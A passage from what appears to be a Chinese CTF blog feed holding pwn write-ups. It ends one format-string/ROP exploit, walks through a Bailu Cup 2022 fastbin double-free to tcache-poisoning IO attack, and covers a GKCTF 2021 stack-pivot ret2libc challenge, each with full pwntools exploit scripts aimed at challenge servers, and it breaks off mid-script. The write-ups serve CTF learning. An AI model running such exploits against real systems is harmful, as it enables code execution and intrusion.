class="number">0xc0</span>-<span class="number">0x8c</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%12$hhn%&#x27;</span></span><br><span class="line">    payload+=<span class="built_in">str</span>(<span class="number">0xd5</span>-<span class="number">0xc0</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%13$hhn%265$p&#x27;</span>+p64(return_addr)+p64(stdout)+p64(stdout+<span class="number">1</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;info1&#x27;</span>,p.recv())</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    </span><br><span class="line">    payload=<span class="string">b&#x27;%265$p%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x8c</span>-<span class="number">14</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%10$hhnaaaaaaaaaaaaaa&#x27;</span>+p64(return_addr)+p64(stdout)+p64(stdout+<span class="number">1</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        leak_libc_addr=<span class="built_in">int</span>(p.recv(<span class="number">14</span>,timeout=<span class="number">0.5</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;============&gt; YES &lt;==============&#x27;</span>)</span><br><span class="line">    libc_base_addr=leak_libc_addr-<span class="number">0x440f6b</span><span class="comment">#0x440f5b</span></span><br><span class="line">    log_addr(<span class="string">&#x27;leak_libc_addr&#x27;</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base_addr&#x27;</span>)</span><br><span class="line">    pop_rdi=base_addr+<span class="number">0x1543</span></span><br><span class="line">    pop_rsi_r15=base_addr+<span class="number">0x1541</span></span><br><span class="line">    pop_rdx_r12=libc_base_addr+<span class="number">0x119211</span><span class="comment">#0x119241</span></span><br><span class="line">    open_addr=libc_base_addr+<span class="number">0x10dce0</span><span class="comment">#0x10dd10+</span></span><br><span class="line">    write_addr=libc_base_addr+<span class="number">0x10e060</span><span class="comment">#0x10e090+</span></span><br><span class="line">    read_addr=libc_base_addr+<span class="number">0x10dfc0</span><span class="comment">#0x10dff0+</span></span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,0x14B9,0x146C)</span></span><br><span class="line">    csu_addr_l=(<span class="number">0x153b</span>+base_addr)&amp;<span class="number">0xff</span></span><br><span class="line">    csu_addr_h=((<span class="number">0x153b</span>+base_addr)&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span></span><br><span class="line">    log_addr(<span class="string">&#x27;csu_addr_l&#x27;</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;csu_addr_h&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> csu_addr_h&gt;csu_addr_l:</span><br><span class="line">        payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(csu_addr_l).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%9$hhn&#x27;</span>+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(csu_addr_h-csu_addr_l).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%10$hhnaaa&#x27;</span>+p64(return_addr)+p64(return_addr+<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(csu_addr_h).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%9$hhn&#x27;</span>+<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(csu_addr_l-csu_addr_h).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%10$hhnaaa&#x27;</span>+p64(return_addr+<span class="number">1</span>)+p64(return_addr)</span><br><span class="line">    <span class="comment">#rop=b&#x27;aaaaaaaaaaaaaaaa%&#x27;+str(csu_addr).encode(&#x27;utf-8&#x27;)+b&#x27;c%10$hnaaaaa&#x27;+p64(return_addr)+p64(stdout)+p64(stdout+1)</span></span><br><span class="line">    rop=payload</span><br><span class="line">    rop+=p64(pop_rdi)+p64(return_addr+<span class="number">8</span>+<span class="number">0xc0</span>+<span class="number">40</span>)</span><br><span class="line">    rop+=p64(pop_rsi_r15)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    rop+=p64(open_addr)</span><br><span class="line">    </span><br><span class="line">    rop+=p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">    rop+=p64(pop_rsi_r15)+p64(return_addr+<span class="number">0x200</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    rop+=p64(pop_rdx_r12)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    rop+=p64(read_addr)</span><br><span class="line"></span><br><span class="line">    rop+=p64(pop_rdi)+p64(<span class="number">2</span>)</span><br><span class="line">    rop+=p64(pop_rsi_r15)+p64(return_addr+<span class="number">0x200</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    rop+=p64(pop_rdx_r12)+p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    rop+=p64(write_addr)</span><br><span class="line">    rop+=<span class="string">b&#x27;flag.txt\x00&#x27;</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;size&#x27;</span>,<span class="built_in">len</span>(rop))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.sendline(rop)</span><br><span class="line">    p.interactive()</span><br><span class="line">    </span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="comment">#p=process(&#x27;./a&#x27;)</span></span><br><span class="line">    p=remote(<span class="string">&#x27;192.168.1.106&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line">    i=i+<span class="number">1</span>   </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;------------&gt;&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;&lt;--------------&#x27;</span>)</span><br><span class="line">    pwn()</span><br><span class="line">    p.close()</span><br></pre></td></tr></table></figure><p><img src="../img/2706180-20220708092056673-14521637.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 赛题WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> orw </tag>
            
            <tag> close关闭文件描述符 </tag>
            
            <tag> magic_gadget </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022柏鹭杯-note2</title>
      <link href="/posts/f523ff3f.html"/>
      <url>/posts/f523ff3f.html</url>
      
        <content type="html"><![CDATA[<p>通过本题的学习明白了，高版本中 <code>fastbin</code> 做出 <code>double free</code> 是如何打 <code>tcache poisoning</code> 的过程。并且了解到了一条新的 <code>IO</code> 链，目前感觉是最好用的一条，可以通杀 <code>2.36</code> 及以下的 <code>libc</code> 版本 具体请见 <a href="https://tttang.com/archive/1845/">文章</a></p><p>这位师傅提供了题目附件  <a href="https://www.cnblogs.com/tolele/p/16701827.html">2022年柏鹭杯 pwn题复现 - tolele - 博客园 (cnblogs.com)</a></p><h3 id="题目信息">题目信息</h3><p>本题存在一个 <code>UAF</code> 漏洞，并且可以无限次的使用 <code>add</code> 和 <code>delete</code> <code>show</code> 函数，<code>size</code> 被限定到了 <code>0x200</code> 以下，并且可以触发 <code>exit</code> 函数退出。（ <code>libc</code> 版本为 <code>2.35</code>）</p><h3 id="解题思路">解题思路</h3><p>因为没有 <code>edit</code> 函数，因此我们考虑 <code>double free</code> ，但由于 <code>key</code> 机制的存在，无法直接在 <code>tcache bin</code> 直接打 <code>double free</code>，解决方法有两种，第一是 <a href="https://zikh26.github.io/posts/6b7e3e3a.html#house-of-botcake">house of botcake</a> ，这个方法本题是可以打通的，不过主要的学习收获是第二种方法，就是填满 <code>tcache bin</code> ，然后在 <code>fast bin</code>中做出 <code>double free</code> ，再打 <code>tcache poisoning</code> 将 <code>IO_list_all</code> 申请出来写入堆地址，从而触发最后的 <code>IO attack</code>。</p><p>本文主要介绍在 <code>fastbin</code> 中做出的 <code>double free</code> 是如何打出 <code>tcache poisoning </code> ，至于 <code>safe-Linking</code> 机制的绕过和 <code>IO_attack</code> 不再介绍。</p><h3 id="double-free-与-tcache-poisoning"><code>double free</code> 与 <code>tcache poisoning</code></h3><p><code>malloc</code> 函数内部执行会先进入 <code>libc_malloc</code> 函数，判断是否 <code>tcache bin</code>  的链上有需要的堆块，如果没有的话则进入 <code>int_malloc</code> 函数（有的话则申请出来，直接返回）</p><p>在 <code>int_malloc</code> 函数的最开始就去判断了 <code>fastbin</code> 中对应的链上是否有所需要的堆块，如果有的话就将该堆块取出，作为接下来要返回给用户的堆块。同时去判断这条链上是否还有堆块，如果还有堆块并且 <code>tcache bin</code> 上对应的这条链还有空位置，就将 <code>fastbin</code> 剩下的堆块都放入 <code>tcache bin</code> 中（除非 <code>tcache bin</code> 被填满了）</p><p>本题 <code>double free</code> 以及 <code>tcache poisoning</code> 的利用思路是先将 <code>tcache bin</code> 填满，然后正常的在 <code>fastbin</code> 链中做出 <code>double free</code> （如 <code>A-&gt;B-&gt;A</code>）</p><p>接着再将 <code>tcache bin</code> 中的堆块全部取出（此时的情况如下）   <strong>注意： <code>fastbin</code> 中的 <code>fd</code> 指针也是经过了异或运算的</strong></p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304202244388.png" alt="image-20230420224449196"></p><p><code>ptmalloc</code> 对于 <code>fastbin</code> 中堆块移入 <code>tcache bin</code> 的机制是这样处理的。（最初的结构为 <code>A-&gt;B-&gt;A</code>）（如下）</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304202330662.png" alt="image-20230420233034606"></p><ol><li>首先判断 <code>fastbin</code> 中第一个堆块 <code>A</code> 的 <code>fd</code> 指针是否为空，来检测该链是否还有其他堆块</li><li>无论该链是否有其他堆块，都会将 <code>A</code> 取出来暂存（为之后返回给用户做准备），而将 <code>A</code> 取出后 <code>fastbin</code> 中的结构变成了 <code>B-&gt;A-&gt;B</code></li><li>如果该 <code>fastbin</code> 链已经没有其他堆块了，那么就将刚刚的 <code>A</code> 返回给用户</li><li>如果检测出该链还有其他堆块，并且 <code>tcache bin</code> 对应的这条链没有满，就逐个将堆块链出 <code>fastbin</code> ，链入 <code>tcache bin</code></li><li>因为此时的 <code>tcache bin</code> 是空的，那就不考虑 <code>tcache bin</code> 被装满的这个限制，上面提到此时的结构是 <code>B-&gt;A-&gt;B</code> ，先去移动当前 <code>fastbin</code> 的第一个堆块 <code>B</code> ，因为 <code>double free</code> 的特殊性，在从 <code>fastbin</code>  取出一个堆块 <code>B</code> 后，其结构变为了 <code>A-&gt;B-&gt;A</code> <strong>此时刚刚取出的堆块还没有进入 <code>tcache bin</code></strong></li><li>刚刚这个取出的堆块链入到 <code>tcache bin</code> 时，其 <code>next</code> 指针一定会被置成 <code>0</code>，因为 <code>tcache bin</code> 最初是没有堆块的，此时的 <code>fastbin</code>  结构会受到 <code>tcache bin</code> 中堆块 <code>B</code> <code>next</code> 指针置 <code>0</code> 的影响，从而结构变成了 <code>A-&gt;B-&gt;0</code> （因为这个置空的 <code>next</code> 指针是 <code>B</code> 堆块的，因此并不会干扰到 <code>A-&gt;B</code> 的这个关系）</li><li>依次类推，从 <code>fastbin</code> 中取出 <code>A</code>然后再放入到 <code>tcachebin</code> 中，此时的 <code>fastbin</code> 为 <code>B-&gt;0</code> ，<code>tcache bin</code> 为 <code>A-&gt;B</code>（ <code>LIFO</code> ）</li><li><code>fastbin</code> 中最后一个 <code>B</code> 进入 <code>tcache bin</code> ，此时 <code>tcache bin</code> 的结构为 <code>B-&gt;A-&gt;B</code> （由于确实是有三个堆块进入了 <code>tcache bin</code> 所以此时的 <code>tcache_counts</code> 为 <code>3</code>）</li></ol><p>因为最初就确定了申请出去的是 <code>A</code>，所以 <code>malloc</code> 返回出来 <code>A</code> 后，将数据写入 <code>A</code> 中篡改 <code>next</code> 指针（因为 <code>A</code> 此时还在 <code>tcache bin</code> 中），从而完成了 <code>tcache poisoning</code> 。因此写入数据后的结构为 <code>B-&gt;A-&gt;address</code> （如下）</p><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304202330323.png" alt="image-20230420233021223"></p><p>简单总结一下：将 <code>tcache bin</code> 填满，然后在 <code>fastbin</code> 中做 <code>double free</code> ，申请出一个堆块后，可以直接打 <code>tcache poisoning</code> ，并且不用担心 <code>tcache_counts</code> 的问题</p><p>因为将 <code>IO_list_all</code> 申请出来了，后面就是 <code>IO_FILE</code> 的伪造和布局，本文重点不在这里，就此略过。不过 <a href="https://zikh26.github.io/posts/ad411136.html">tools函数库</a> 封装了该 <code>obstack</code> 链的攻击模板，直接使用即可。</p><h3 id="EXP">EXP</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;note2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;Enter content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base=recv_libc()-<span class="number">0x219ce0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i,<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------leak key----------------</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap_base=(u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)))&lt;&lt;<span class="number">12</span></span><br><span class="line">log_addr(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"><span class="comment">#--------------------------------------</span></span><br><span class="line">par=&#123;</span><br><span class="line">    <span class="string">&quot;io_obstack_jumps&quot;</span>:libc_base+<span class="number">0x2163c0</span></span><br><span class="line">    ,<span class="string">&quot;system&quot;</span>:libc_base+<span class="number">0x50d60</span></span><br><span class="line">&#125;</span><br><span class="line">par_dict=create_dict(par)</span><br><span class="line">heap_addr=<span class="number">0x1020</span>+heap_base <span class="comment">#位于io_list_all的chunk用户区</span></span><br><span class="line">payload=obstack_attack(heap_addr-<span class="number">0x10</span>,par_dict)</span><br><span class="line"><span class="comment">#--------------------------------------------------</span></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x200</span>,payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x154C</span>,<span class="number">0x1540</span>)  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io_list_all=((heap_base+<span class="number">0xf40</span>)&gt;&gt;<span class="number">12</span>)^(libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>])</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x60</span>,p64(io_list_all))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>,p64(heap_addr-<span class="number">0x10</span>))<span class="comment">#get io_list_all</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304211042218.png" alt="image-20230421104243994"></p>]]></content>
      
      
      <categories>
          
          <category> 赛题WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> orw </tag>
            
            <tag> IO attack </tag>
            
            <tag> double free </tag>
            
            <tag> 高版本libc </tag>
            
            <tag> tcache poisoning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GKCTF 2021_checkin</title>
      <link href="/posts/a81fb7da.html"/>
      <url>/posts/a81fb7da.html</url>
      
        <content type="html"><![CDATA[<h1>总结：</h1><p>1、这道题md5加密这个点，其实蛮重要的，个人感觉想判断出来的话，只能是靠经验的积累。下回只要遇见了这种奇奇怪怪的函数，还给了类似于密文这种东西，就去考虑加密。</p><p>2、能够输入的字节很少的时候，执行某个函数，可以尝试写call的这个地址，这样即可以执行函数，又可以控制执行流（只要我们可以把控好选取的call地址即可）</p><p>3、后期调试的话，多按自己的思路思考（不要被网上其他师傅写的wp所局限了）。</p><h1>保护策略：</h1><p><img src="../img/2706180-20220331215203116-666268230.png" alt=""></p><h1>程序分析：</h1><p><img src="../img/2706180-20220331215212743-248424037.png" alt=""></p><p>输入点有两处，第一次输入是输入到bss段，第二次输入是给到buf,存在八字节的溢出。一看这种存在八字节的溢出基本就可以确定是栈迁移没跑了。</p><p>然后第一次输入的数据，前五个字节必须是admin，否则的话就会触发exit。同时sub_401974函数的返回值也必须是0，否则就会触发exit。我们肯定是不能去触发这个exit的，不然程序直接就结束了。</p><p><img src="../img/2706180-20220331215224208-1732771002.png" alt=""></p><p>观察sub_401974函数，发现这个函数很奇怪，首先是给了个数组v4，然后赋了两个莫名其妙的值，然后发现返回值的地方有一个判断，只要v5有一个字节和v4的不同，就返回1（这并不是我们想要的），如果能成功的跑16次循环，也就是说v5与v4的十六个字节全部相同，才会返回我们想要的0。</p><p>看看v5是什么？点进sub_400990函数看一下</p><p><img src="../img/2706180-20220331215234682-403874894.png" alt=""></p><p>发现很奇怪，然后把每个函数都点一下，发现就更奇怪了…</p><p>想遇见这种奇奇怪怪的情况，就考虑加密的形式。而最开始给的v4的值，就是密文。</p><p>然后就转一下看看（淦，其实我也是看师傅的wp才知道这是md5加密的，这只能靠经验和积累来判断吧？），发现是md5加密。</p><p><img src="../img/2706180-20220331215251779-22545722.png" alt=""></p><p>由于这个是小端序存放的v4，转换过来的话，应该是从右往左看。</p><p>取出来是个这玩意 21232f297a57a5a743894a0e4a801fc3</p><p>找个在线网站转一下</p><p><img src="../img/2706180-20220331215302448-1617321460.png" alt=""></p><p>如此思路就出来了，第一次要输入admin，去通过strncmp函数的检查，第二次还要输入admin，去通过与md5匹配的检查。那两次输入都是admin，我们怎么去劫持程序的执行流？  这里我们是可以采用00截断的，意思就是说用00来声明md5加密的内容结束，而00后面的就不会被加密了，但00后面的内容已经是存在的。</p><h1>大致思路：</h1><p>这道题必然是考察栈迁移的，我们虽然只能控制rbp，但是由于这个函数结束的时候会执行一个leave;ret，而到main函数结束的时候又会执行一个leave;ret，因此我们只需要控制rbp，依然是可以完成栈迁移的。</p><p>这道题由于没办法泄露栈地址，因此迁移的话，肯定就是bss段。第一次在bss段输入内容的话，一共只能输入32字节，除去8字节的admin（admin后面还需要再填充3个00，用于补齐这一个内存单元），只剩下了24字节，我们肯定是考虑ret2libc的，那现在要做的就是泄露出来一个函数的真实地址。</p><p>问题是pop rdi占八字节，参数占八字节，执行puts又占八字节，这样看来，我们似乎是没办法控制返回地址了。</p><p>那这件事先缓一缓，我们再想一下，泄露出来了真实地址之后，肯定是要再来一次输入，将one_gadget的地址写入内存。同时还需要控制程序执行流，去执行这个one_gadget。综上所述，想完成这件事情，似乎我们只能是再跑一次程序，同时在跑之前还需要执行个puts函数。</p><p><img src="../img/2706180-20220331215315108-697859807.png" alt=""></p><p>那我们把执行puts的地址写成0x4018B5,这样它不但执行了puts函数，同时让程序的执行流又从sub_4018c7函数（这个函数就是程序的主要部分）开始跑了。</p><h2 id="通过调试来进一步分析">通过调试来进一步分析</h2><p>然后此时应该调试一下，看看程序的情况。再做进一步完善exp。</p><p><img src="../img/2706180-20220331215325473-1898764410.png" alt=""></p><p>此时是在第二次执行往bss段输入的那个read函数，可以看出来现在还一切正常。似乎只要布置一个admin和one_gadget地址，然后第二次利用那个read完成一次迁移就行了，但是事实真的这么简单么？</p><p><img src="../img/2706180-20220331215334034-1303724362.png" alt=""></p><p>现在来到了第二次往栈里输入的read，可以发现它输入的内容是往0x6023f0输入的，这意味着我们刚刚输入的admin和one_gadget会被这次输入的内容所覆盖（因为我们现在的栈就已经在bss段了，因此这次输入会干扰第一次输入）。先注意一下rbp的值，我们第二次输入的目的就是在不破坏one_gadget的情况下，覆盖rbp迁移到one_gadget这里。现在这里的输入距离rbp还有32个字节。这就意味着我们要是想控制这个rbp就必须覆盖之前写的one_gadget了。</p><p>不过最关键的一点是不是被忽略了，往bss段输入的那个read函数，可以输入32字节，如果我们把one_gadget给抬高呢？抬高到第24字节再布置（相当于0x602400地址来说，也就是此时的one_gadget应该是在0x602418的位置），而我们再输入32字节的话再写rbp的话，这个rbp也才是在0x602410这个位置（第二次输入是相当于0x6023f0来说），这样rbp就没有干扰到one_gadget</p><p>或者用另一种方法，我们第一次就输入一个admin，第二次输入的时候，我们同时布置one_gadget和覆盖rbp。控制rbp去迁移到one_gadget上面，二者的核心思路都是一样的。</p><p>然后就exp基本就出来了，需要注意的是，如果打远程，one_gadget搜索的是用题目给的libc，如果的打本地，one_gadget搜自己本地的libc。（另外就是，这道题用不了system加参数/bin/sh获取shell，不信的话，试一下就知道了）</p><h1>EXP：</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26765</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#这里本地还是远程，自己切换一下库</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi_ret=<span class="number">0x401ab3</span></span><br><span class="line">call_puts_addr=<span class="number">0x4018B5</span></span><br><span class="line">payload=<span class="string">&#x27;admin\x00\x00\x00&#x27;</span>+p64(pop_rdi_ret)+p64(puts_got_addr)+p64(call_puts_addr)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">4</span>+p64(<span class="number">0x602400</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="comment">#yuancheng 0x4527a</span></span><br><span class="line">one_gadget=libc_base+<span class="number">0x4527a</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#bendi</span></span><br><span class="line"><span class="comment">#one_gadget=libc_base+0x4f302</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">payload=<span class="string">&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">3</span>+p64(one_gadget)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">4</span>+p64(<span class="number">0x602400</span>+<span class="number">0x18</span>)<span class="comment">#迁移到one_gadget</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>下面这个是第一次只输入admin，第二次同时布置one_gadget和控制rbp的exp。可以看出来，这个exp和上面的区别也仅仅是最后一点不一样。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26765</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">pop_rdi_ret=<span class="number">0x401ab3</span></span><br><span class="line">call_puts_addr=<span class="number">0x4018B5</span></span><br><span class="line">payload=<span class="string">&#x27;admin\x00\x00\x00&#x27;</span>+p64(pop_rdi_ret)+p64(puts_got_addr)+p64(call_puts_addr)</span><br><span class="line">pause()</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">&#x27;admin\x00\x00\x00&#x27;</span>*<span class="number">4</span>+p64(<span class="number">0x602400</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span 